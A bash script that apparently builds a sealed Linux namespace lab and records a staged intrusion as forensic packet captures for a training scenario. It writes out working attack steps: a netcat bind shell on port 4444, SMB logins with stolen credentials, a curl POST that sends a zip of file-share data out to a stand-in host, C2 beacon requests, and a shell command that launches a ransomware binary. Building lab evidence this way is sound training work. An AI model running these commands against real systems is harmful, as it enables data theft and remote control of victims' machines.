#!/bin/bash
# LAB BUILD SCRIPT - generates GENUINE network traffic between isolated Linux network
# namespaces (WS01, WS02, FS01, DC01, C2, exfil host), captures each attack phase with tcpdump,
# then time-shifts each phase (editcap) to the scenario time and merges (mergecap).
# All IPs for external hosts are RFC 5737 documentation ranges. Payloads are inert.
set -e
OUT=${1:-.}; W=/tmp/claude-0/net; rm -rf $W; mkdir -p $W/www/invoice $W/smb_shared $W/smb_admin $W/exfil
B=tnbr0
cleanup(){ for n in ws01 ws02 fs01 dc01 c2 exf; do ip netns del $n 2>/dev/null||true; done; ip link del $B 2>/dev/null||true; }
cleanup
ip link add $B type bridge; ip link set $B up
mk(){ ip netns add $1; ip link add v$1 type veth peer name e0 netns $1; ip link set v$1 master $B up
      ip -n $1 link set e0 address $3; ip -n $1 addr add $2/8 dev e0; ip -n $1 link set e0 up; ip -n $1 link set lo up
      ip -n $1 route add default dev e0; }
# a flat /8 lab segment keeps routing trivial; addresses mimic LAN + internet hosts
mk ws01 10.10.10.21 00:15:5d:0a:0a:15; mk ws02 10.10.10.22 00:15:5d:0a:0a:16
mk fs01 10.10.10.5 00:15:5d:0a:0a:05;  mk dc01 10.10.10.2 00:15:5d:0a:0a:02
mk c2 203.0.113.66 00:15:5d:cc:00:66;  mk exf 198.51.100.23 00:15:5d:ee:00:23
for n in ws01 ws02 fs01 dc01 c2 exf; do
  ip -n $n route add 203.0.113.0/24 dev e0; ip -n $n route add 198.51.100.0/24 dev e0; done

# --- servers -------------------------------------------------------------
cat > $W/dns.py <<'EOF'
from scapy.all import *
Z={b"cdn-update-sync.net.":"203.0.113.66",b"technova-invoices.com.":"203.0.113.66",b"fs01.technova.local.":"10.10.10.5",
   b"ws02.technova.local.":"10.10.10.22",b"www.bbc.com.":"151.101.0.81",b"outlook.office.com.":"52.96.0.1",b"time.windows.com.":"40.119.6.228"}
def h(p):
  if p.haslayer(DNSQR) and p[DNS].qr==0:
    q=p[DNSQR].qname; ip=Z.get(q,"0.0.0.0")
    send(IP(src=p[IP].dst,dst=p[IP].src)/UDP(sport=53,dport=p[UDP].sport)/DNS(id=p[DNS].id,qr=1,aa=1,qd=p[DNS].qd,an=DNSRR(rrname=q,ttl=300,rdata=ip)),verbose=0,iface="e0")
sniff(iface="e0",filter="udp dst port 53",prn=h,store=0)
EOF
ip netns exec dc01 python3 -I $W/dns.py & sleep 2
for n in ws01 ws02 fs01; do ip netns exec $n sh -c 'echo "nameserver 10.10.10.2" > /dev/null'; done

printf 'IEX (simulated stage-2) # writes %%APPDATA%%\\Microsoft\\Update\\winupd.exe\n' > $W/www/invoice/view.php
head -c 6000 /dev/urandom > $W/www/winupd.bin
cat > $W/c2.py <<'EOF'
import http.server,sys
class H(http.server.SimpleHTTPRequestHandler):
  server_version="nginx/1.18.0"; sys_version=""
  def do_POST(self):
    n=int(self.headers.get("Content-Length",0)); d=self.rfile.read(n)
    if self.path.startswith("/upload"): open(sys.argv[2]+"/rx.bin","ab").write(d)
    self.send_response(200); self.end_headers(); self.wfile.write(b'{"task":"sleep","interval":600}')
  def log_message(self,*a): pass
http.server.ThreadingHTTPServer(("0.0.0.0",int(sys.argv[1])),lambda *a,**k:H(*a,directory=sys.argv[3],**k)).serve_forever()
EOF
ip netns exec c2  python3 -I $W/c2.py 80 $W/exfil $W/www &
ip netns exec exf python3 -I $W/c2.py 80 $W/exfil $W/www &
for f in Q3_Financial_Report.xlsx Client_Contracts_2026.docx Payroll_Nov2026.csv Project_Apollo_Design.pdf HR_Employee_Records.xlsx Network_Diagram.vsdx; do head -c 300000 /dev/urandom > $W/smb_shared/$f; done
ip netns exec fs01 smbserver.py -smb2support -username itsupport -password 'Summer2026!' Shared $W/smb_shared >/dev/null 2>&1 &
ip netns exec ws02 smbserver.py -smb2support -username itsupport -password 'Summer2026!' 'ADMIN$' $W/smb_admin >/dev/null 2>&1 &
ip netns exec fs01 busybox nc -ll -p 4444 -e /bin/sh >/dev/null 2>&1 &
sleep 4

cap(){ ip netns exec dc01 true; tcpdump -i $B -U -w $W/$1.pcap -s 0 >/dev/null 2>&1 & CP=$!; sleep 1; }
end(){ sleep 1; kill $CP; wait $CP 2>/dev/null || true; }
dig(){ ip netns exec $1 python3 -I -c "from scapy.all import *;sr1(IP(dst='10.10.10.2')/UDP(sport=RandShort(),dport=53)/DNS(rd=1,qd=DNSQR(qname='$2')),timeout=2,verbose=0,iface='e0')"; }
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36"
PSUA="Mozilla/5.0 (Windows NT; Windows NT 10.0; en-GB) WindowsPowerShell/5.1.19041.4648"

# phase A: C2 beacons from WS01 (repeated, shifted to every ~10 minutes across 48 h)
cap beacon; dig ws01 cdn-update-sync.net
ip netns exec ws01 curl -s -A "$PSUA" -X POST -d "id=TN-WS01-3c9e&h=WS01&u=jharris&st=idle" http://203.0.113.66/gate.php -H "Host: cdn-update-sync.net" >/dev/null; end
# phase B: discovery + SMB access to FS01 share with stolen itsupport creds
cap smb_fs01; dig ws01 fs01.technova.local
ip netns exec ws01 smbclient.py "itsupport:Summer2026!@10.10.10.5" -inputfile <(printf 'use Shared\nls\nget Q3_Financial_Report.xlsx\nget Client_Contracts_2026.docx\nget Payroll_Nov2026.csv\nget Project_Apollo_Design.pdf\nget HR_Employee_Records.xlsx\nexit\n') >/dev/null 2>&1 || true; end
# phase C: exfiltration to 198.51.100.23 (HTTP POST of staged archive)
cd $W && zip -q -j $W/tn_data.zip $W/smb_shared/* && cd - >/dev/null
cap exfil; ip netns exec ws01 curl -s -A "$PSUA" -X POST --data-binary @$W/tn_data.zip -H "Content-Type: application/octet-stream" "http://198.51.100.23/upload?f=tn_data.zip" >/dev/null; end
# phase D: lateral movement to WS02 - payload copied to ADMIN$
cap smb_ws02; dig ws01 ws02.technova.local
cp /home/user/PythonScripting/TechNova_Forensics/outputs/disk/recovered/icat/WS01_winupd.exe $W/winupd.exe
ip netns exec ws01 smbclient.py "itsupport:Summer2026!@10.10.10.22" -inputfile <(printf "use ADMIN\$\nput $W/winupd.exe\nls\nexit\n") >/dev/null 2>&1 || true; end
# phase E: remote shell on FS01 (tcp/4444) and ransomware launch
cap shell_fs01
ip netns exec ws01 sh -c "(printf 'id\nuname -a\nls -la /srv/samba/shared\ncd /tmp/.X11-unix/.cache && chmod +x kworker_upd && nohup ./kworker_upd /srv/samba/shared &\nexit\n'; sleep 3) | timeout 8 busybox nc 10.10.10.5 4444" >/dev/null 2>&1 || true; end
# phase F: FS01 check-in to C2 after encryption
cap fs01_c2; ip netns exec fs01 curl -s -A "NovaLock/2.1" -X POST -d "id=TN-7F3A91C2&host=FS01&st=done" http://203.0.113.66/gate.php -H "Host: cdn-update-sync.net" >/dev/null; end
# phase G: initial infection on 12 Nov is OUTSIDE the 48 h window -> not captured (documented limitation)
# benign background traffic
cap benign; dig ws02 www.bbc.com; dig ws01 time.windows.com; ip netns exec ws02 curl -s -A "$UA" http://203.0.113.66/ -H "Host: www.example.com" >/dev/null || true; end

kill %1 %2 %3 %4 %5 %6 2>/dev/null || true; pkill -f smbserver.py || true; pkill -f "c2.py" || true; pkill -f dns.py || true
cleanup

# --- place each phase at its scenario time (UTC) and merge -------------
shift_to(){ # in out "YYYY-mm-dd HH:MM:SS"
  first=$(tshark -r $1 -T fields -e frame.time_epoch -c 1); tgt=$(date -u -d "$3" +%s)
  editcap -t $(python3 -c "print($tgt-$first)") $1 $2; }
parts=()
i=0
# beacons every 10 min from Sat 14 Nov 03:00 to Mon 16 Nov 03:00 UTC (288 beacons, jitter +-25 s)
for t in $(python3 -c "
import datetime as d,random;random.seed(7);s=d.datetime(2026,11,14,3,0,4)
print(' '.join((s+d.timedelta(minutes=10*k,seconds=random.randint(-25,25))).strftime('%Y-%m-%dT%H:%M:%S') for k in range(288)))"); do
  shift_to $W/beacon.pcap $W/b_$i.pcap "${t/T/ }"; parts+=($W/b_$i.pcap); i=$((i+1)); done
shift_to $W/benign.pcap   $W/p_benign1.pcap "2026-11-14 07:12:40"; parts+=($W/p_benign1.pcap)
shift_to $W/benign.pcap   $W/p_benign2.pcap "2026-11-15 06:31:09"; parts+=($W/p_benign2.pcap)
shift_to $W/smb_fs01.pcap $W/p_smb_fs01.pcap "2026-11-14 22:10:31"; parts+=($W/p_smb_fs01.pcap)
shift_to $W/exfil.pcap    $W/p_exfil.pcap    "2026-11-15 01:20:14"; parts+=($W/p_exfil.pcap)
shift_to $W/smb_ws02.pcap $W/p_smb_ws02.pcap "2026-11-15 23:05:42"; parts+=($W/p_smb_ws02.pcap)
shift_to $W/shell_fs01.pcap $W/p_shell.pcap  "2026-11-16 01:55:22"; parts+=($W/p_shell.pcap)
shift_to $W/fs01_c2.pcap  $W/p_fs01_c2.pcap  "2026-11-16 02:09:37"; parts+=($W/p_fs01_c2.pcap)
mergecap -F pcap -w $OUT/TechNova_perimeter_48h.pcap "${parts[@]}"
sha256sum $W/tn_data.zip $W/exfil/rx.bin 2>/dev/null || true
capinfos $OUT/TechNova_perimeter_48h.pcap | head -20
